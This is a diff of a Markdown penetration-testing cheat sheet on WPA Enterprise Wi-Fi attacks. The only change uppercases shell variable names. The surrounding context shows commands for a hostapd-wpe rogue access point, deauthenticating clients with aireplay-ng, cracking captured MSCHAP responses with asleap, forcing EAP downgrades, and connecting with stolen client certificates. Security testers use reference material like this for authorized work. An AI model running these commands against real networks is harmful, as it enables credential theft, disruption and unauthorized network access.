@@ -27,7 +27,7 @@ WPA Enterprise uses **802.1X/EAP** authentication against a **RADIUS** server. N
 
 ```bash
 # Enterprise = "MGT" in AUTH column
-airodump-ng $interface
+airodump-ng $INTERFACE
 ```
 
 ```bash
@@ -40,9 +40,9 @@ auxiliary/scanner/wifi/wifi_eapol_test
 ::: details hostapd-wpe (Wireless Pwnage Edition)
 
 ```ini
-interface=$interface
-ssid=$ssid
-channel=$channel
+interface=$INTERFACE
+ssid=$SSID
+channel=$CHANNEL
 hw_mode=g
 wpa=2
 wpa_key_mgmt=WPA-EAP
@@ -120,7 +120,7 @@ response: 00112233445566778899aabbccddeeff:11223344556677889900aabbccddeeff00
 ::: code-group
 
 ```bash [asleap]
-asleap -C $challenge -R $response -w rockyou.txt
+asleap -C $CHALLENGE -R $RESPONSE -w rockyou.txt
 ```
 
 ```bash [hashcat]
@@ -142,7 +142,7 @@ Force client to use weaker EAP method when AP supports multiple.
 
 ```ini
 network={
-  ssid="$ssid"
+  ssid="$SSID"
   key_mgmt=WPA-EAP
   eap=PEAP
   identity="test"
@@ -151,8 +151,8 @@ network={
 ```
 
 ```bash
-wpa_supplicant -dd -i $interface -c wpa.conf
-sudo dhclient $interface
+wpa_supplicant -dd -i $INTERFACE -c wpa.conf
+sudo dhclient $INTERFACE
 ```
 
 :::
@@ -176,10 +176,10 @@ Spoof target SSID with malicious RADIUS server.
 
 ```bash
 # Start rogue AP
-hostapd-wpe -s "$ssid" hostapd-wpe.conf
+hostapd-wpe -s "$SSID" hostapd-wpe.conf
 
 # Optionally deauth clients from legit AP
-aireplay-ng -0 10 -a $bssid $interface
+aireplay-ng -0 10 -a $BSSID $INTERFACE
 
 # Wait for connections
 tail -f /tmp/hostapd-wpe/hostapd-wpe.log
@@ -230,10 +230,10 @@ openssl x509 -in client_cert.pem -subject -issuer -dates
 ```bash
 # wpa.conf
 network={
-  ssid="$ssid"
+  ssid="$SSID"
   key_mgmt=WPA-EAP
   eap=TLS
-  identity="$username"
+  identity="$USERNAME"
   ca_cert="ca.pem"
   client_cert="stolen.pem"
   private_key="stolen.key"
@@ -241,8 +241,8 @@ network={
 ```
 
 ```bash
-wpa_supplicant -i $interface -c wpa.conf
-sudo dhclient $interface
+wpa_supplicant -i $INTERFACE -c wpa.conf
+sudo dhclient $INTERFACE
 ```
 
 :::
